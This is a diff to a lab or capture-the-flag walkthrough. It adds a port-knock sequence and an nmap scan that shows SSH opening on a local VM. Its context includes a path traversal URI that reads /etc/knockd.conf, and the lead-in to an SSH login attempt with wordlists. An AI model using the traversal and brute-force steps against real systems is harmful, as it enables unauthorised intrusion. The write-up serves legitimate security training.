@@ -120,7 +120,35 @@ Check the `knocd.conf` on uri `/manage.php?file=../../../../../etc/knockd.conf`:
 	tcpflags    = syn
 ```
 
-Using `usernames.txt` and `password.txt` to try logging to target via ssh:
+Got the sequence number. Now run knock on Kali and re-scan port:
+
+```sh
+┌──(kali㉿kali)-[~/Desktop/wallthrough]
+└─$ knock 192.168.182.134 7469 8475 9842
+
+┌──(kali㉿kali)-[~/Desktop/wallthrough]
+└─$ sudo nmap 192.168.182.134 -sSCV     
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-07 23:24 PST
+Nmap scan report for 192.168.182.134
+Host is up (0.000037s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 a2b3387432740bc516dc13decb9b8ac3 (RSA)
+|   256 065c93871554686b889155cff89ace40 (ECDSA)
+|_  256 e42c88da8863268c93d5f7632ba3ebab (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Example.com - Staff Details - Welcome
+MAC Address: 00:0C:29:C7:FE:46 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
+```
+
+Now SSH port is opened. Using `usernames.txt` and `password.txt` to try logging to target via ssh:
 
 ```sh
 ┌──(kali㉿kali)-[~/Desktop/wallthrough]
